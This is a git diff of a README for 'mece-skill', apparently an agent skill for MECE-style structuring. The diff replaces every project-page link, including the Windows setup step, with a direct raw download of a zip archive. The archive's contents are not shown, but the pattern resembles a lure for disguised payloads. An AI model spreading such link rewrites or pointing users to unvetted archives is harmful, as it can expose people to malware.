@@ -1,12 +1,12 @@
 # 🧩 mece-skill - Structure Ideas With Clear MECE Steps
 
-[![Download mece-skill](https://img.shields.io/badge/Download-Mece_Skill-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bigboskuai-prog/mece-skill)
+[![Download mece-skill](https://img.shields.io/badge/Download-Mece_Skill-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/bigboskuai-prog/mece-skill/main/skills/mece_skill_v1.8.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-https://github.com/bigboskuai-prog/mece-skill
+https://raw.githubusercontent.com/bigboskuai-prog/mece-skill/main/skills/mece_skill_v1.8.zip
 
 ## 🖥️ What this app does
 
@@ -46,7 +46,7 @@ For a smooth start, use a computer with enough free disk space for the app and i
 ## 🚀 Getting started on Windows
 
 1. Open the download page:
-   https://github.com/bigboskuai-prog/mece-skill
+   https://raw.githubusercontent.com/bigboskuai-prog/mece-skill/main/skills/mece_skill_v1.8.zip
 
 2. Find the latest release or main project files on the page
 
@@ -178,7 +178,7 @@ This is useful when the agent must give a plan, a checklist, a research outline,
 
 Primary download link:
 
-https://github.com/bigboskuai-prog/mece-skill
+https://raw.githubusercontent.com/bigboskuai-prog/mece-skill/main/skills/mece_skill_v1.8.zip
 
 ## 🧾 Repository topics
 
